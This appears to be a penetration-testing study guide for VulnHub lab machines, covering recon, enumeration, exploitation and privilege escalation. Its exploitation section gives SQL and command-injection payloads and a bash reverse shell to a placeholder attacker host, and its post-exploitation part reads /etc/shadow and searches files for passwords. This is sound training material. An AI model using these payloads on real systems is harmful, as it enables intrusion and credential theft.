# 1. Introduction to VulnHub Machines

## What VulnHub Machines Are

- Standalone intentionally vulnerable VMs
- Created by many authors with varying quality
- Often OSCP‑style: single host, one or two flags
- Range from beginner to extremely advanced

## Why VulnHub Matters

- Builds real‑world recon and enumeration skills
- Forces you to generalize beyond known labs
- Helps develop pattern recognition across OS and services
- Excellent preparation for OSCP, PNPT, CRTO, etc.

## What VulnHub Is NOT

- Not standardized
- Not always realistic
- Not always documented
- Not guaranteed to be solvable without guesswork

---

# 2. System Architecture & Attack Surface

## Typical Layout

- Single Linux VM (most common)
- Occasionally Windows
- Services vary widely:
    - Web
    - SSH
    - SMB
    - Databases
    - Custom daemons
    - Misconfigured services

## Key Attack Surface Categories

- Open ports
- Web applications
- Local privilege escalation
- Misconfigurations (sudo, SUID, cron, PATH, capabilities)
- Hard‑coded credentials
- Backup files
- Dev artifacts
- Hidden directories

## Instructor Note

Treat every VulnHub machine as **unknown territory**.  
No assumptions — only evidence.

# 3. Lab Setup & Networking

## Recommended Setup

- Kali: NAT + Host‑only
- VulnHub VM: Host‑only

## Verify Connectivity

```bash
ip a
ping <VULNHUB-IP>
arp -a
```

If IP is unknown:

```bash
nmap -sn <network>/24
netdiscover
arp-scan <network>/24
```

## Common Issues

- Wrong adapter type
- DHCP not assigning IP
- VM boots but no services listening

# 4. Reconnaissance Workflows

## Host Discovery

```bash
nmap -sn <network>/24
netdiscover
arp-scan <network>/24
```

## Full TCP Port Scan

```bash
nmap -p- -T4 <IP> -oN full_tcp.txt
```

## Service Scan

```bash
nmap -sC -sV -oN service_scan.txt <IP>
```

## What You Should Identify

- All open ports
- Service versions
- Likely foothold vectors
- Potential privilege escalation paths

# 5. Enumeration Workflows

## Web Enumeration (if HTTP/HTTPS present)

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Look for:

- `/admin/`
- `/login/`
- `/uploads/`
- `/backup/`
- `/dev/`
- CMS paths (WordPress, Joomla, Drupal)

---

## SMB Enumeration (if 139/445 open)

```bash
smbclient -L //<IP>/ -N
enum4linux -a <IP>
```

---

## SSH Enumeration (if 22 open)

```bash
ssh -v <user>@<IP>
```

Look for:

- Banner
- Auth methods
- Weak/default creds

---

## Database Enumeration

```bash
mysql -h <IP> -u root -p
```

or:

```bash
nmap --script=mysql* -p 3306 <IP>
```

---

## Custom Service Enumeration

- Banner grabbing with `nc`
- NSE scripts
- Manual protocol fuzzing

# 6. Vulnerability Analysis

## Typical VulnHub Patterns

- Outdated CMS with public exploits
- Misconfigured sudo / SUID binaries
- World‑writable scripts run by root
- Hard‑coded credentials
- Local file inclusion → shell
- Command injection
- Weak SSH keys
- Reused passwords

## Prioritization

1. Remote code execution
2. Authentication bypass
3. Local privilege escalation
4. Lateral movement (rare)
5. Post‑exploitation objectives

# 7. Exploitation Workflows

## Web Exploitation (Generic)

### SQL Injection

```bash
' OR 1=1-- -
" OR 1=1-- -
```

Use:

```bash
sqlmap -u "http://<IP>/vuln.php?id=1" --batch
```

---

### Command Injection

```bash
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | uname -a
```

Reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1'
```

---

### File Upload

Try:

- `.php`
- `.php5`
- `.phtml`
- Double extensions
- MIME spoofing

---

## Metasploit (Optional)

```bash
msfconsole
search <service>
use <module>
set RHOSTS <IP>
run
```

# 8. Privilege Escalation

## Linux PrivEsc Checklist

```bash
uname -a
id
sudo -l
find / -perm -4000 2>/dev/null
find / -writable -type f 2>/dev/null
ls -la /etc/passwd /etc/shadow
crontab -l
ls -la /tmp /var/tmp /dev/shm
```

Look for:

- SUID binaries
- Writable scripts run by root
- Misconfigured sudo
- PATH hijacking
- Kernel exploits (old kernels)

---

## Windows PrivEsc (If Windows VulnHub Box)

- `systeminfo`
- `whoami /priv`
- Unquoted service paths
- Weak service permissions
- Stored creds in config files

# 9. Post‑Exploitation

## Objectives

- Capture user flag
- Capture root/system flag
- Enumerate sensitive data
- Identify potential lateral movement

## Data Collection

```bash
cat /etc/passwd
cat /etc/shadow (if readable)
ls -R /home
grep -Ri "password" / 2>/dev/null
```

# 13. Troubleshooting & Common Pitfalls

## No Entry Point

- Re‑scan
- Try UDP
- Try different wordlists

## Exploit Works but No Shell

- Wrong LHOST/LPORT
- Firewall
- Wrong payload

## Stuck on PrivEsc

- Re‑run enumeration
- Check SUID/cron/sudo again
- Consider kernel exploits last
